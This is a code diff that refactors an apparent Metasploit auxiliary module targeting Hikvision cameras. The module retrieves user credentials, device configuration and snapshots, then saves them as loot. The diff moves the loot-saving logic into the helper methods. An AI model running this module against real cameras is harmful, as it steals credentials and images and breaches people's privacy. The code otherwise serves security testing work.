@@ -84,14 +84,16 @@ class MetasploitModule < Msf::Auxiliary
     return nil
   end
 
+  def report_creds(user, pwd)
     credential_data = {
-        module_fullname: self.fullname,
-        username: user,
-        private_data: pwd,
-        private_type: :password,
-        workspace_id: myworkspace_id,
-        status: Metasploit::Model::Login::Status::UNTRIED
+      module_fullname: fullname,
+      username: user,
+      private_data: pwd,
+      private_type: :password,
+      workspace_id: myworkspace_id,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_details)
+
     cred_res = create_credential_and_login(credential_data)
     unless cred_res.nil?
       print_status("Credentials for user:#{user} are added to the database...")
@@ -127,6 +129,7 @@ class MetasploitModule < Msf::Auxiliary
     loot_data = ''
     pwd = nil
 
+    print_status('Getting the user credentials...')
     uri = normalize_uri(target_uri.path, 'Security', 'users')
     creds_info = get_info(uri)
 
@@ -155,13 +158,20 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error('Response code invalid for obtaining the user credentials.')
     end
-    return loot_data
+    unless loot_data.nil?
+      if datastore['PRINT'] == true
+        print_status(loot_data.to_s)
+      end
+      loot_path = store_loot('hikvision.credential', 'text/plain', datastore['RHOSTS'], loot_data, 'credentials', 'leaked credentials')
+      print_good("User credentials are successfully saved to #{loot_path}")
+    end
   end
 
   def get_config
     loot_data = ''
 
     # Get device info
+    print_status('Getting the camera hardware and software configuration...')
     uri = normalize_uri(target_uri.path, 'System', 'deviceInfo')
     device_info = get_info(uri)
 
@@ -257,13 +267,20 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error('Response code invalid for obtaining camera storage configuration.')
     end
-    return loot_data
+    unless loot_data.nil?
+      if datastore['PRINT'] == true
+        print_status(loot_data.to_s)
+      end
+      loot_path = store_loot('hikvision.config', 'text/plain', datastore['RHOSTS'], loot_data, 'configuration', 'camera configuration')
+      print_good("Camera configuration details are successfully saved to #{loot_path}")
+    end
   end
 
   def take_snapshot
     jpeg_image = nil
 
     # Take a snapshot and store as jpeg
+    print_status('Taking a camera snapshot...')
     uri = normalize_uri(target_uri.path, 'Streaming', 'channels', '1', 'picture?snapShotImageType=JPEG')
     res = get_info(uri)
 
@@ -274,7 +291,10 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error('Response code invalid for obtaining a camera snapshot.')
     end
-    return jpeg_image
+    unless jpeg_image.nil?
+      loot_path = store_loot('hikvision.image', 'jpeg/image', datastore['RHOSTS'], jpeg_image, 'snapshot', 'camera snapshot')
+      print_good("Camera snapshot is successfully saved to #{loot_path}")
+    end
   end
 
   def check
@@ -296,60 +316,15 @@ class MetasploitModule < Msf::Auxiliary
     case action.name
     when 'Automatic'
       print_status('Running in automatic mode')
-
-      print_status('Getting the user credentials...')
-      creds_loot_data = get_creds
-      unless creds_loot_data.nil?
-        if datastore['PRINT'] == true
-          print_status(creds_loot_data.to_s)
-        end
-        loot_path = store_loot('hikvision.credential', 'text/plain', datastore['RHOSTS'], creds_loot_data, 'credentials', 'leaked credentials')
-        print_good("User credentials are successfully saved to #{loot_path}")
-      end
-
-      print_status('Getting the camera hardware and software configuration...')
-      config_loot_data = get_config
-      unless config_loot_data.nil?
-        if datastore['PRINT'] == true
-          print_status(config_loot_data.to_s)
-        end
-        loot_path = store_loot('hikvision.config', 'text/plain', datastore['RHOSTS'], config_loot_data, 'configuration', 'camera configuration')
-        print_good("Camera configuration details are successfully saved to #{loot_path}")
-      end
-
-      print_status('Taking a camera snapshot...')
-      snapshot_loot_data = take_snapshot
-      unless snapshot_loot_data.nil?
-        loot_path = store_loot('hikvision.image', 'jpeg/image', datastore['RHOSTS'], snapshot_loot_data, 'snapshot', 'camera snapshot')
-        print_good("Camera snapshot is successfully saved to #{loot_path}")
-      end
+      get_creds
+      get_config
+      take_snapshot
     when 'Credentials'
-      print_status('Getting the user credentials...')
-      creds_loot_data = get_creds
-      unless creds_loot_data.nil?
-        if datastore['PRINT'] == true
-          print_status(creds_loot_data.to_s)
-        end
-        loot_path = store_loot('hikvision.credential', 'text/plain', datastore['RHOSTS'], creds_loot_data, 'credentials', 'leaked credentials')
-        print_good("User credentials are successfully saved to #{loot_path}")
-      end
+      get_creds
     when 'Configuration'
-      print_status('Getting the camera hardware and software configuration...')
-      config_loot_data = get_config
-      unless config_loot_data.nil?
-        if datastore['PRINT'] == true
-          print_status(config_loot_data.to_s)
-        end
-        loot_path = store_loot('hikvision.config', 'text/plain', datastore['RHOSTS'], config_loot_data, 'configuration', 'camera configuration')
-        print_good("Camera configuration details are successfully saved to #{loot_path}")
-      end
+      get_config
     when 'Snapshot'
-      print_status('Taking a camera snapshot...')
-      snapshot_loot_data = take_snapshot
-      unless snapshot_loot_data.nil?
-        loot_path = store_loot('hikvision.image', 'jpeg/image', datastore['RHOSTS'], snapshot_loot_data, 'snapshot', 'camera snapshot')
-        print_good("Camera snapshot is successfully saved to #{loot_path}")
-      end
+      take_snapshot
     end
   end
 end
